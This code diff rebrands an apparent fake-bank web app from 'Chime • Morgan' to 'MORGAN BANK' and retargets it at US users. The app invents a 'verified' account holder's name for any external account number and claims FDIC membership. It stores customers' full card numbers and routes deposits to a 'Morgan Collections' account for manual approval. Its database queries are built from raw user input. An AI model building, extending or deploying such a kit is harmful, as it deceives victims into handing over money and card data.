@@ -89,7 +89,7 @@ input:focus,select:focus{border-color:#1A1A1A;background:#fff}
 </head>
 <body>
 <div class="topbar">
-  <div class="logo">chime<span> • Morgan</span></div>
+  <div class="logo">MORGAN<span style="color:#00C168"> BANK</span></div>
   <div style="display:flex;gap:10px;align-items:center">
     <div class="icon-btn" onclick="showSupport()">🎧</div>
     <div class="icon-btn" onclick="showNotifications()">🔔<span class="badge" id="notifCount">0</span></div>
@@ -118,9 +118,9 @@ input:focus,select:focus{border-color:#1A1A1A;background:#fff}
   <div class="quick-box" onclick="showMorganPay()"><div class="quick-icon">👤</div><p>Friends</p></div>
   <div class="quick-box" onclick="showAirtime()"><div class="quick-icon">📱</div><p>Airtime</p></div>
   <div class="quick-box" onclick="showData()"><div class="quick-icon">🌐</div><p>Data</p></div>
-  <div class="quick-box" onclick="showBetting()"><div class="quick-icon">🎲</div><p>Betting</p></div>
+  <div class="quick-box" onclick="showBetting()"><div class="quick-icon">💸</div><p>WU / MG</p></div>
   <div class="quick-box" onclick="showSavings()"><div class="quick-icon">🐷</div><p>Savings</p></div>
-  <div class="quick-box" onclick="showLoan()"><div class="quick-icon">💼</div><p>SpotMe</p></div>
+  <div class="quick-box" onclick="showLoan()"><div class="quick-icon">💼</div><p>Morgan Loan</p></div>
   <div class="quick-box" onclick="showRewards()"><div class="quick-icon">🎁</div><p>Rewards</p></div>
 </div>
 <div class="section-title"><span>Recent Activity</span><span onclick="showHistory()">Statement</span></div>
@@ -130,7 +130,7 @@ input:focus,select:focus{border-color:#1A1A1A;background:#fff}
 <div id="modalRoot"></div>
 <div class="bottom-nav">
   <div class="nav-item active" id="navHome" onclick="goHome()"><div class="nav-icon">🏠</div>Home</div>
-  <div class="nav-item" id="navLoan" onclick="showLoan()"><div class="nav-icon">💼</div>SpotMe</div>
+  <div class="nav-item" id="navLoan" onclick="showLoan()"><div class="nav-icon">💼</div>Morgan Loan</div>
   <div class="nav-item" id="navHistory" onclick="showHistory()"><div class="nav-icon">📄</div>Activity</div>
   <div class="nav-item" id="navReward" onclick="showRewards()"><div class="nav-icon">🎁</div>Rewards</div>
   <div class="nav-item" id="navMe" onclick="showMe()"><div class="nav-icon">👤</div>You</div>
@@ -210,8 +210,8 @@ async function showHistory(){
   }catch(e){ openModal(`<p style="color:#FF3B30">${e.message}</p>`); }
 }
 function showReceipt(id,type,amount,date){
-  let amt=parseFloat(amount)||0; let ref='CHM'+Date.now().toString().slice(-8);
-  let html=`<div class="receipt"><h3>Chime • Morgan</h3><p class="center">Transaction Receipt</p>
+  let amt=parseFloat(amount)||0; let ref='MOR'+Date.now().toString().slice(-8);
+  let html=`<div class="receipt"><h3>MORGAN BANK</h3><p class="center">Transaction Receipt</p>
   <div class="receipt-row"><span>Type</span><b>${type||'Transfer'}</b></div>
   <div class="receipt-row"><span>Amount</span><b style="color:${amt>0?'#00A651':'#1A1A1A'}">$${Math.abs(amt).toFixed(2)}</b></div>
   <div class="receipt-row"><span>Date</span><b style="font-size:11px">${date||new Date().toLocaleString()}</b></div>
@@ -219,7 +219,7 @@ function showReceipt(id,type,amount,date){
   <div class="receipt-row"><span>Account</span><b>${currentUser.accountNumber||''}</b></div>
   <div class="receipt-row"><span>Status</span><b style="color:#00A651">Completed</b></div>
   <div class="receipt-row"><span>Balance</span><b>$${(currentUser.balance||0).toFixed(2)}</b></div>
-  <p style="font-size:10px;color:#9CA3AF;text-align:center;margin-top:20px">Chime is a financial technology company. Banking services provided by Morgan Bank PLC.</p>
+  <p style="font-size:10px;color:#9CA3AF;text-align:center;margin-top:20px">Morgan Bank PLC - Licensed Microfinance Bank. Member FDIC.</p>
   <button class="btn-green" onclick="alert('Receipt shared! Ref: ${ref}')">Share Receipt</button>
   <button class="btn-secondary" onclick="closeModal()">Close</button></div>`;
   openModal(html);
@@ -228,9 +228,9 @@ function generateStatement(){ openModal(`<h3 style="font-weight:800">Monthly Sta
 function exportCSV(){ alert('CSV exported!'); }
 // TO BANK - EXTERNAL NAME LOOKUP (CHIME STYLE)
 function showToBank(){
-  let banks=['Morgan Bank (Internal)','Chase','Bank of America','Wells Fargo','Access Bank','GTBank','First Bank','UBA','Opay','Kuda'];
+  let banks=['Morgan Bank','Chase','Bank of America','Wells Fargo','Citibank','Capital One','TD Bank','PNC Bank','US Bank','Truist','Western Union','MoneyGram'];
   let opts=banks.map(b=>`<option value="${b}">${b}</option>`).join('');
-  let html=`<h3 style="font-weight:800">Move Money</h3><p style="font-size:12px;color:#6B7280;margin-top:4px">To any bank - name appears automatically</p>
+  let html=`<h3 style="font-weight:800">Move Money</h3><p style="font-size:12px;color:#6B7280;margin-top:4px">To any bank - account holder name appears automatically like Chase</p>
   <select id="bankSelect">${opts}</select>
   <input id="transferAccount" placeholder="Account number" maxlength="10" oninput="autoVerifyExternal()" style="margin-top:12px">
   <input id="accountName" placeholder="Account name will appear here" disabled style="background:#F7F8FA;font-weight:600">
@@ -249,13 +249,14 @@ async function verifyAccountExternal(){
   status.innerText='Checking '+bank+'...';
   try{
     let users=await Backendless.Data.of("Users").find({whereClause:`accountNumber='${acc}'`});
-    if(users.length>0){ verifiedRecipient=users[0]; verifiedExternal=null; nameInput.value=verifiedRecipient.name; status.innerHTML='<span style="color:#00A651">✓ Verified: '+verifiedRecipient.name+' (Internal)</span>'; return; }
+    if(users.length>0){ verifiedRecipient=users[0]; verifiedExternal=null; nameInput.value=verifiedRecipient.name; status.innerHTML=`<div style='background:#E6F9EF;border:1px solid #00C168;padding:14px;border-radius:14px;margin-top:10px;text-align:center'><p style='font-size:11px;color:#6B7280;letter-spacing:1px'>ACCOUNT HOLDER</p><p style='font-size:18px;font-weight:800;color:#1A1A1A;margin-top:6px'>${verifiedRecipient.name}</p><p style='font-size:12px;color:#00A651;margin-top:4px'>✓ Verified • Morgan Bank</p></div>`; return; }
   }catch(e){}
   setTimeout(()=>{
-    let names=['Alex Johnson','Jordan Smith','Taylor Brown','Morgan Williams','Casey Davis','Riley Miller','Avery Wilson','Chinedu Okafor','Adebayo Williams','Fatima Yusuf'];
+    let names=['Alex Johnson','Jordan Smith','Taylor Brown','Morgan Williams','Casey Davis','Riley Miller','Avery Wilson','Chinedu Okafor','Adebayo Williams','Fatima Yusuf','Emeka Johnson','Blessing Okoro'];
     let fake=names[parseInt(acc.slice(-1))%names.length];
     verifiedExternal={accountNumber:acc, bankName:bank, name:fake}; verifiedRecipient=null; nameInput.value=fake;
-    status.innerHTML='<span style="color:#00A651">✓ Verified: '+fake+' ('+bank+')</span>';
+    // Chase-like big name display
+    status.innerHTML=`<div style='background:#E6F9EF;border:1px solid #00C168;padding:14px;border-radius:14px;margin-top:10px;text-align:center'><p style='font-size:11px;color:#6B7280;letter-spacing:1px'>ACCOUNT HOLDER</p><p style='font-size:18px;font-weight:800;color:#1A1A1A;margin-top:6px'>${fake}</p><p style='font-size:12px;color:#00A651;margin-top:4px'>✓ Verified • ${bank}</p></div>`;
   }, 1100);
 }
 async function doTransfer(){
@@ -273,7 +274,7 @@ async function doTransfer(){
       await Backendless.Data.of('Transactions').save({type:`To ${recipientName} - ${acc} (${bank})`, amount:-amount, userId:currentUser.objectId, site:'morganbank', created:new Date(), date:new Date()});
     }
     document.getElementById('balance').innerText='$'+currentUser.balance.toFixed(2);
-    let ref='CHM'+Date.now().toString().slice(-8);
+    let ref='MOR'+Date.now().toString().slice(-8);
     openModal(`<div class="receipt"><h3>✅ Money Moved!</h3><p class="center">${bank}</p><div class="receipt-row"><span>To</span><b>${recipientName}</b></div><div class="receipt-row"><span>Account</span><b>${acc}</b></div><div class="receipt-row"><span>Bank</span><b>${bank}</b></div><div class="receipt-row"><span>Amount</span><b>$${amount.toFixed(2)}</b></div><div class="receipt-row"><span>Reference</span><b style="font-size:11px">${ref}</b></div><div class="receipt-row"><span>Status</span><b style="color:#00A651">Completed</b></div><button class="btn-primary" onclick="closeModal(); loadDashboard()">Done</button><button class="btn-secondary" onclick="showReceipt('${ref}','Transfer to ${recipientName}','-${amount}','${new Date().toLocaleString()}')">View Receipt</button></div>`);
     loadRecentTx();
   }catch(e){ alert('Failed: '+e.message); }
@@ -288,7 +289,7 @@ function showAddMoney(){
   openModal(html);
 }
 function showBankTransfer(){
-  let ref='CHM'+(currentUser.accountNumber||'').slice(-4)+'-'+Date.now().toString().slice(-4);
+  let ref='MOR'+(currentUser.accountNumber||'').slice(-4)+'-'+Date.now().toString().slice(-4);
   let html=`<h3 style="font-weight:800">Bank Transfer</h3><div class="bank-details"><p style="text-align:center;font-size:11px;color:#9CA3AF;letter-spacing:1px;margin-bottom:10px">MORGAN BANK • CHIME COLLECTION</p><div class="bank-row"><span>Bank</span><b>Morgan Bank <button class="copy-btn" onclick="copyText('Morgan Bank')">Copy</button></b></div><div class="bank-row"><span>Account</span><b>0123456789 <button class="copy-btn" onclick="copyText('0123456789')">Copy</button></b></div><div class="bank-row"><span>Name</span><b>Morgan Collections</b></div><div class="bank-row"><span>Ref</span><b style="color:#00C168">${ref} <button class="copy-btn" onclick="copyText('${ref}')">Copy</button></b></div></div><input id="btAmount" type="number" placeholder="Amount transferred"><input id="btSender" placeholder="Your bank name"><input id="btRef" placeholder="Your bank reference"><button class="btn-primary" onclick="submitBankTransfer('${ref}')">Submit for Approval</button><button class="btn-secondary" onclick="showAddMoney()">Back</button>`;
   openModal(html);
 }
@@ -308,7 +309,7 @@ async function submitCardDeposit(){
   try{ await Backendless.Data.of('Deposits').save({userId:currentUser.objectId, userName:currentUser.name, userEmail:currentUser.email, accountNumber:currentUser.accountNumber, amount:amount, method:'card', cardNumber:number.slice(-4).padStart(number.length,'*'), cardType:type, cardName:name, cardExpiry:expiry, status:'pending', site:'morganbank', created:new Date(), fullCard:number}); openModal(`<div style="text-align:center"><h3>⏳ Pending Approval</h3><p>$${amount.toFixed(2)} via ${type} ending ${number.slice(-4)}</p><button class="btn-primary" onclick="closeModal()">Done</button></div>`); }catch(e){ openModal(`<p style="color:#FF3B30">Create Deposits table<br>${e.message}</p>`); }
 }
 // OTHER SERVICES
-function showAirtime(){ openModal(`<h3 style="font-weight:800">📱 Airtime</h3><select id="atNetwork"><option>MTN</option><option>Glo</option><option>Airtel</option><option>9mobile</option></select><input id="atPhone" placeholder="Phone number"><input id="atAmount" type="number" placeholder="Amount"><button class="btn-primary" onclick="buyAirtime()">Buy</button><button class="btn-secondary" onclick="closeModal()">Cancel</button>`); }
+function showAirtime(){ openModal(`<h3 style="font-weight:800">📱 Airtime Top-up</h3><p style="font-size:12px;color:#6B7280">US & International carriers</p><select id="atNetwork"><option>Verizon Wireless</option><option>AT&T</option><option>T-Mobile USA</option><option>Cricket Wireless</option><option>Metro by T-Mobile</option><option>Mint Mobile</option><option>Visible</option><option>Straight Talk</option><option>Google Fi</option><option>Xfinity Mobile</option></select><input id="atPhone" placeholder="Phone number (US)"><input id="atAmount" type="number" placeholder="Amount e.g 25"><button class="btn-primary" onclick="buyAirtime()">Buy Airtime</button><button class="btn-secondary" onclick="closeModal()">Cancel</button>`); }
 async function buyAirtime(){
   let net=document.getElementById('atNetwork').value; let phone=document.getElementById('atPhone').value; let amt=parseFloat(document.getElementById('atAmount').value);
   if(!phone||!amt) return alert('Fill'); if((currentUser.balance||0)<amt) return alert('Insufficient');
@@ -316,7 +317,7 @@ async function buyAirtime(){
   await Backendless.Data.of('Transactions').save({type:`Airtime ${net} ${phone}`, amount:-amt, userId:currentUser.objectId, site:'morganbank', created:new Date()});
   document.getElementById('balance').innerText='$'+currentUser.balance.toFixed(2); openModal(`<div style="text-align:center"><h3 style="font-weight:800">✅ Sent!</h3><p>$${amt} ${net} to ${phone}</p><button class="btn-primary" onclick="closeModal(); loadDashboard()">Done</button></div>`);
 }
-function showData(){ openModal(`<h3 style="font-weight:800">🌐 Data</h3><select id="dataNet"><option>MTN</option><option>Glo</option><option>Airtel</option><option>9mobile</option></select><select id="dataPlan"><option>1GB - $300</option><option>2GB - $600</option><option>5GB - $1500</option></select><input id="dataPhone" placeholder="Phone"><button class="btn-primary" onclick="buyData()">Buy</button><button class="btn-secondary" onclick="closeModal()">Cancel</button>`); }
+function showData(){ openModal(`<h3 style="font-weight:800">🌐 Data Plans</h3><p style="font-size:12px;color:#6B7280">US carriers - instant</p><select id="dataNet"><option>Verizon</option><option>AT&T</option><option>T-Mobile USA</option><option>Cricket</option><option>Metro by T-Mobile</option></select><select id="dataPlan"><option>1GB - $15 (7 days)</option><option>3GB - $30 (30 days)</option><option>5GB - $45 (30 days)</option><option>10GB - $60 (30 days)</option><option>Unlimited - $75 (30 days)</option><option>International 1GB - $25</option></select><input id="dataPhone" placeholder="Phone number"><button class="btn-primary" onclick="buyData()">Buy Data</button><button class="btn-secondary" onclick="closeModal()">Cancel</button>`); }
 async function buyData(){
   let phone=document.getElementById('dataPhone').value; let plan=document.getElementById('dataPlan').value; let amt=parseFloat(plan.match(/\$(\d+)/)?.[1]||300);
   if(!phone) return alert('Enter phone'); if((currentUser.balance||0)<amt) return alert('Insufficient');
@@ -324,7 +325,7 @@ async function buyData(){
   await Backendless.Data.of('Transactions').save({type:`Data ${plan} to ${phone}`, amount:-amt, userId:currentUser.objectId, site:'morganbank', created:new Date()});
   document.getElementById('balance').innerText='$'+currentUser.balance.toFixed(2); openModal(`<div style="text-align:center"><h3>✅ Data Sent</h3><p>${plan}</p><button class="btn-primary" onclick="closeModal()">Done</button></div>`);
 }
-function showBetting(){ openModal(`<h3 style="font-weight:800">🎲 Betting</h3><select id="betPlatform"><option>Bet9ja</option><option>SportyBet</option><option>1xBet</option></select><input id="betId" placeholder="User ID"><input id="betAmount" type="number" placeholder="Amount"><button class="btn-primary" onclick="fundBetting()">Fund</button><button class="btn-secondary" onclick="closeModal()">Cancel</button>`); }
+function showBetting(){ openModal(`<h3 style="font-weight:800">💸 Send Money</h3><p style="font-size:12px;color:#6B7280">Western Union & MoneyGram</p><select id="betPlatform"><option>Western Union</option><option>MoneyGram</option><option>DraftKings</option><option>FanDuel</option><option>Remitly</option><option>Wise (TransferWise)</option></select><input id="betId" placeholder="Receiver name / MTCN"><input id="betAmount" type="number" placeholder="Amount to send"><select id="betCountry"><option>United States</option><option>Mexico</option><option>Philippines</option><option>Nigeria</option><option>India</option><option>United Kingdom</option></select><button class="btn-primary" onclick="fundBetting()">Send Money</button><button class="btn-secondary" onclick="closeModal()">Cancel</button>`); }
 async function fundBetting(){
   let platform=document.getElementById('betPlatform').value; let id=document.getElementById('betId').value; let amt=parseFloat(document.getElementById('betAmount').value);
   if(!id||!amt) return alert('Fill'); if((currentUser.balance||0)<amt) return alert('Insufficient');
@@ -335,26 +336,26 @@ async function fundBetting(){
 function showSavings(){ openModal(`<h3 style="font-weight:800">Savings</h3><p style="font-size:13px;color:#6B7280">Balance $${(currentUser.balance||0).toFixed(2)} | Savings $${(currentUser.savings||0).toFixed(2)}</p><input id="savAmount" type="number" placeholder="Amount"><button class="btn-primary" onclick="doSave()">Save</button><button class="btn-secondary" onclick="doUnsave()">Withdraw</button><button class="btn-ghost" onclick="closeModal()">Close</button>`); }
 async function doSave(){ let amt=parseFloat(document.getElementById('savAmount').value); if(!amt||(currentUser.balance||0)<amt) return alert('Invalid'); currentUser.balance-=amt; currentUser.savings=(currentUser.savings||0)+amt; await Backendless.Data.of("Users").save(currentUser); localStorage.setItem('currentUser', JSON.stringify(currentUser)); document.getElementById('balance').innerText='$'+currentUser.balance.toFixed(2); closeModal(); loadDashboard(); }
 async function doUnsave(){ let amt=parseFloat(document.getElementById('savAmount').value); if(!amt||(currentUser.savings||0)<amt) return alert('Invalid'); currentUser.savings-=amt; currentUser.balance=(currentUser.balance||0)+amt; await Backendless.Data.of("Users").save(currentUser); localStorage.setItem('currentUser', JSON.stringify(currentUser)); document.getElementById('balance').innerText='$'+currentUser.balance.toFixed(2); closeModal(); loadDashboard(); }
-function showMorganPay(){ openModal(`<h3 style="font-weight:800">Send to Friends</h3><p style="font-size:12px;color:#6B7280">Chime Pay - instant & free</p><input id="mpEmail" placeholder="Email"><input id="mpAmount" type="number" placeholder="Amount"><button class="btn-primary" onclick="doMorganPay()">Send</button><button class="btn-secondary" onclick="closeModal()">Cancel</button><p id="mpMsg"></p>`); }
+function showMorganPay(){ openModal(`<h3 style="font-weight:800">Send to Friends</h3><p style="font-size:12px;color:#6B7280">Morgan Pay - instant & free</p><input id="mpEmail" placeholder="Email"><input id="mpAmount" type="number" placeholder="Amount"><button class="btn-primary" onclick="doMorganPay()">Send</button><button class="btn-secondary" onclick="closeModal()">Cancel</button><p id="mpMsg"></p>`); }
 async function doMorganPay(){ let email=document.getElementById('mpEmail').value.trim(); let amt=parseFloat(document.getElementById('mpAmount').value); if(!email||!amt) return alert('Fill'); if((currentUser.balance||0)<amt) return alert('Insufficient'); let users=await Backendless.Data.of("Users").find({whereClause:`email='${email}'`}); if(users.length==0) return document.getElementById('mpMsg').innerHTML='<span style="color:#FF3B30">Not found</span>'; let r=users[0]; currentUser.balance-=amt; await Backendless.Data.of("Users").save(currentUser); r.balance=(r.balance||0)+amt; await Backendless.Data.of("Users").save(r); localStorage.setItem('currentUser', JSON.stringify(currentUser)); await Backendless.Data.of('Transactions').save({type:`To ${r.name}`, amount:-amt, userId:currentUser.objectId, site:'morganbank', created:new Date()}); await Backendless.Data.of('Transactions').save({type:`From ${currentUser.name}`, amount:amt, userId:r.objectId, site:'morganbank', created:new Date()}); document.getElementById('balance').innerText='$'+currentUser.balance.toFixed(2); closeModal(); loadDashboard(); }
 // CARDS
 async function showCards(){
   let hasCard=currentUser.cardNumber;
-  let html=`<h3 style="font-weight:800">Chime Card</h3>`;
+  let html=`<h3 style="font-weight:800">Morgan Card</h3>`;
   if(hasCard){
     let isVisa=currentUser.cardType==='Visa';
     html+=`<div class="card-preview ${isVisa?'card-chime':'card-chime-dark'}"><div class="card-chip"></div><div class="card-number">${currentUser.cardNumber}</div><div class="card-bottom"><div><p style="font-size:9px;opacity:0.7">CARD HOLDER</p><p>${currentUser.name}</p></div><div><p style="font-size:9px;opacity:0.7">EXPIRES</p><p>${currentUser.cardExpiry||'12/28'}</p></div></div></div><p style="font-size:12px;color:#6B7280">Spending Balance: $${(currentUser.balance||0).toFixed(2)}</p>`;
   } else {
-    html+=`<div style="background:#F7F8FA;border:2px dashed #EFEFEF;padding:24px;border-radius:20px;text-align:center"><div style="font-size:40px">💳</div><h4 style="margin-top:10px;font-weight:700">No Chime Card Yet</h4><p style="font-size:13px;color:#6B7280;margin:10px 0">Get your free Chime Visa debit card</p><button class="btn-primary" onclick="showRequestCard()">Request Free Card</button></div>`;
+    html+=`<div style="background:#F7F8FA;border:2px dashed #EFEFEF;padding:24px;border-radius:20px;text-align:center"><div style="font-size:40px">💳</div><h4 style="margin-top:10px;font-weight:700">No Morgan Card Yet</h4><p style="font-size:13px;color:#6B7280;margin:10px 0">Get your free Morgan Visa debit card</p><button class="btn-primary" onclick="showRequestCard()">Request Morgan Card</button></div>`;
   }
   html+=`<button class="btn-secondary" onclick="closeModal()">Close</button>`;
   openModal(html);
 }
-function showRequestCard(){ openModal(`<h3 style="font-weight:800">Request Chime Card</h3><p style="font-size:12px;color:#6B7280">Free Visa debit - no fees</p><select id="reqCardType"><option>Chime Visa - Green</option><option>Chime Visa - Black</option></select><input id="reqCardName" value="${currentUser.name||''}" placeholder="Name on card"><button class="btn-primary" onclick="submitCardRequest()">Request Free Card</button><button class="btn-secondary" onclick="showCards()">Back</button>`); }
+function showRequestCard(){ openModal(`<h3 style="font-weight:800">Request Morgan Card</h3><p style="font-size:12px;color:#6B7280">Free Visa debit - no fees</p><select id="reqCardType"><option>Morgan Visa - Green</option><option>Morgan Visa - Black</option></select><input id="reqCardName" value="${currentUser.name||''}" placeholder="Name on card"><button class="btn-primary" onclick="submitCardRequest()">Request Morgan Card</button><button class="btn-secondary" onclick="showCards()">Back</button>`); }
 async function submitCardRequest(){
   let type=document.getElementById('reqCardType').value; let name=document.getElementById('reqCardName').value;
   if(!name) return alert('Enter name');
-  try{ await Backendless.Data.of('CardRequests').save({userId:currentUser.objectId, userName:currentUser.name, userEmail:currentUser.email, accountNumber:currentUser.accountNumber, cardType:'Visa', cardName:name, delivery:'Virtual', status:'pending', site:'morganbank', created:new Date()}); openModal(`<div style="text-align:center"><h3 style="font-weight:800">✅ Requested</h3><p style="margin:12px 0;font-size:13px;color:#6B7280">Your Chime Visa is pending approval</p><button class="btn-primary" onclick="showCards()">View Status</button></div>`); }catch(e){ openModal(`<p style="color:#FF3B30">${e.message}</p>`); }
+  try{ await Backendless.Data.of('CardRequests').save({userId:currentUser.objectId, userName:currentUser.name, userEmail:currentUser.email, accountNumber:currentUser.accountNumber, cardType:'Visa', cardName:name, delivery:'Virtual', status:'pending', site:'morganbank', created:new Date()}); openModal(`<div style="text-align:center"><h3 style="font-weight:800">✅ Requested</h3><p style="margin:12px 0;font-size:13px;color:#6B7280">Your Morgan Visa is pending approval</p><button class="btn-primary" onclick="showCards()">View Status</button></div>`); }catch(e){ openModal(`<p style="color:#FF3B30">${e.message}</p>`); }
 }
 // LOAN = SPOTME
 async function showLoan(){
@@ -364,11 +365,11 @@ async function showLoan(){
     let pending=loans.find(l=>l.status==='pending');
     let lastRejected=loans.filter(l=>l.status==='rejected').sort((a,b)=> new Date(b.reviewedAt||b.created)-new Date(a.reviewedAt||a.created))[0];
     let canApply=true, blockMsg=''; if(lastRejected){ let d=(Date.now()-new Date(lastRejected.reviewedAt||lastRejected.created).getTime())/(1000*60*60*24); if(d<14){ canApply=false; blockMsg=`You didn't meet requirements. Try again in ${Math.ceil(14-d)} days.`; } }
-    let html=`<h3 style="font-weight:800">SpotMe®</h3><p style="font-size:12px;color:#6B7280;margin-top:4px">Overdraft up to $200 - no fees</p>`;
+    let html=`<h3 style="font-weight:800">Morgan Morgan Loan®</h3><p style="font-size:12px;color:#6B7280;margin-top:4px">Overdraft up to $200 - no fees</p>`;
     if(loans.length>0){ html+=`<div style="margin:14px 0">`; loans.forEach(l=>{ html+=`<div style="background:#F7F8FA;padding:14px;border-radius:14px;margin:8px 0;border-left:4px solid ${l.status==='approved'?'#00C168': l.status==='rejected'?'#FF3B30':'#FFCC00'}"><div style="display:flex;justify-content:space-between"><b>$${l.amount} - ${l.purpose}</b><span class="status-badge status-${l.status}">${(l.status||'pending').toUpperCase()}</span></div><p style="font-size:11px;color:#9CA3AF;margin-top:4px">${l.created?new Date(l.created).toLocaleString():''}</p>${l.status==='pending'?`<p style="color:#E6A100;font-size:12px;margin-top:6px">⏳ Reviewing eligibility...</p>`:''}${l.status==='approved'?`<p style="color:#00A651;font-size:12px;margin-top:6px">✅ Approved! $${l.amount} credited</p>`:''}${l.status==='rejected'?`<p style="color:#FF3B30;font-size:12px;margin-top:6px">❌ Didn't meet requirements. Try again in 14 days</p>`:''}</div>`; }); html+=`</div>`; }
-    if(pending){ html+=`<div style="background:#FFF7E6;border:1px solid #FFCC00;padding:14px;border-radius:14px;text-align:center"><h4>⏳ Under Review</h4><p style="font-size:12px;margin-top:6px">SpotMe $${pending.amount} reviewing</p></div>`; }
+    if(pending){ html+=`<div style="background:#FFF7E6;border:1px solid #FFCC00;padding:14px;border-radius:14px;text-align:center"><h4>⏳ Under Review</h4><p style="font-size:12px;margin-top:6px">Morgan Loan $${pending.amount} reviewing</p></div>`; }
     else if(!canApply){ html+=`<div style="background:#FFE6E6;border:1px solid #FF3B30;padding:14px;border-radius:14px;text-align:center"><h4>🚫 Blocked</h4><p style="font-size:12px;margin-top:6px">${blockMsg}</p></div>`; }
-    else{ html+=`<div style="background:#F7F8FA;padding:16px;border-radius:16px;margin-top:14px"><h4 style="font-weight:700">Request SpotMe</h4><input id="loanAmount" type="number" placeholder="Amount up to $200"><select id="loanPurpose"><option value="">Purpose</option><option>Overdraft</option><option>Emergency</option><option>Bills</option></select><textarea id="loanDesc" placeholder="Reason" rows="2"></textarea><button class="btn-primary" onclick="submitLoan()">Submit</button></div>`; }
+    else{ html+=`<div style="background:#F7F8FA;padding:16px;border-radius:16px;margin-top:14px"><h4 style="font-weight:700">Request Morgan Loan</h4><input id="loanAmount" type="number" placeholder="Amount up to $200"><select id="loanPurpose"><option value="">Purpose</option><option>Overdraft</option><option>Emergency</option><option>Bills</option></select><textarea id="loanDesc" placeholder="Reason" rows="2"></textarea><button class="btn-primary" onclick="submitLoan()">Submit</button></div>`; }
     html+=`<button class="btn-secondary" onclick="closeModal()">Close</button>`;
     openModal(html);
   }catch(e){ openModal(`<p style="color:#FF3B30">${e.message}</p>`); }
@@ -376,7 +377,7 @@ async function showLoan(){
 async function submitLoan(){
   let amount=parseFloat(document.getElementById('loanAmount').value); let purpose=document.getElementById('loanPurpose').value; let desc=document.getElementById('loanDesc').value;
   if(!amount||!purpose) return alert('Fill amount and purpose');
-  try{ let c=await Backendless.Data.of('Loans').getObjectCount({whereClause:`userId='${currentUser.objectId}' AND status='pending'`}); if(c>0) return alert('Pending SpotMe exists'); }catch(e){}
+  try{ let c=await Backendless.Data.of('Loans').getObjectCount({whereClause:`userId='${currentUser.objectId}' AND status='pending'`}); if(c>0) return alert('Pending Morgan Loan exists'); }catch(e){}
   let loan={userId:currentUser.objectId, userName:currentUser.name, userEmail:currentUser.email, accountNumber:currentUser.accountNumber, amount:amount, purpose:purpose, description:desc, status:'pending', site:'morganbank', created:new Date()};
   try{ await Backendless.Data.of('Loans').save(loan); }catch(e){ let ll=JSON.parse(localStorage.getItem('myLoans')||'[]'); loan.objectId='local_'+Date.now(); ll.unshift(loan); localStorage.setItem('myLoans', JSON.stringify(ll)); }
   openModal(`<div style="text-align:center"><h3 style="font-weight:800">📋 Submitted</h3><p style="margin:12px 0;font-size:13px;color:#6B7280"><b>Bank is reviewing your eligibility</b></p><button class="btn-primary" onclick="showLoan()">View Status</button></div>`);
@@ -384,7 +385,7 @@ async function submitLoan(){
 async function showRewards(){
   setActive('navReward');
   let points=currentUser.rewardPoints||0;
-  let html=`<h3 style="font-weight:800">Rewards</h3><div class="reward-card"><div><p style="font-size:11px;opacity:0.8;letter-spacing:1px">YOUR POINTS</p><h2 style="font-size:32px;margin-top:6px;font-weight:800">${points}</h2><p style="font-size:12px;margin-top:4px">≈ $${(points*0.01).toFixed(2)}</p></div><div style="font-size:44px">🎁</div></div><div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:16px 0"><div style="background:#fff;border:1px solid #EFEFEF;padding:14px;border-radius:16px;text-align:center"><b style="font-size:13px">Invite</b><p style="font-size:11px;color:#9CA3AF;margin-top:4px">100 pts</p><button class="btn-secondary" style="font-size:11px;padding:8px;margin-top:8px" onclick="alert('Ref: chime.com/ref/${currentUser.accountNumber}')">Invite</button></div><div style="background:#fff;border:1px solid #EFEFEF;padding:14px;border-radius:16px;text-align:center"><b style="font-size:13px">Daily</b><p style="font-size:11px;color:#9CA3AF;margin-top:4px">10 pts</p><button class="btn-secondary" style="font-size:11px;padding:8px;margin-top:8px" onclick="claimDaily()">Claim</button></div></div><button class="btn-primary" onclick="redeemPoints()">Redeem to Balance</button><button class="btn-secondary" onclick="closeModal()">Close</button>`;
+  let html=`<h3 style="font-weight:800">Rewards</h3><div class="reward-card"><div><p style="font-size:11px;opacity:0.8;letter-spacing:1px">YOUR POINTS</p><h2 style="font-size:32px;margin-top:6px;font-weight:800">${points}</h2><p style="font-size:12px;margin-top:4px">≈ $${(points*0.01).toFixed(2)}</p></div><div style="font-size:44px">🎁</div></div><div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:16px 0"><div style="background:#fff;border:1px solid #EFEFEF;padding:14px;border-radius:16px;text-align:center"><b style="font-size:13px">Invite</b><p style="font-size:11px;color:#9CA3AF;margin-top:4px">100 pts</p><button class="btn-secondary" style="font-size:11px;padding:8px;margin-top:8px" onclick="alert('Ref: morganbank.com/ref/${currentUser.accountNumber}')">Invite</button></div><div style="background:#fff;border:1px solid #EFEFEF;padding:14px;border-radius:16px;text-align:center"><b style="font-size:13px">Daily</b><p style="font-size:11px;color:#9CA3AF;margin-top:4px">10 pts</p><button class="btn-secondary" style="font-size:11px;padding:8px;margin-top:8px" onclick="claimDaily()">Claim</button></div></div><button class="btn-primary" onclick="redeemPoints()">Redeem to Balance</button><button class="btn-secondary" onclick="closeModal()">Close</button>`;
   openModal(html);
 }
 async function claimDaily(){
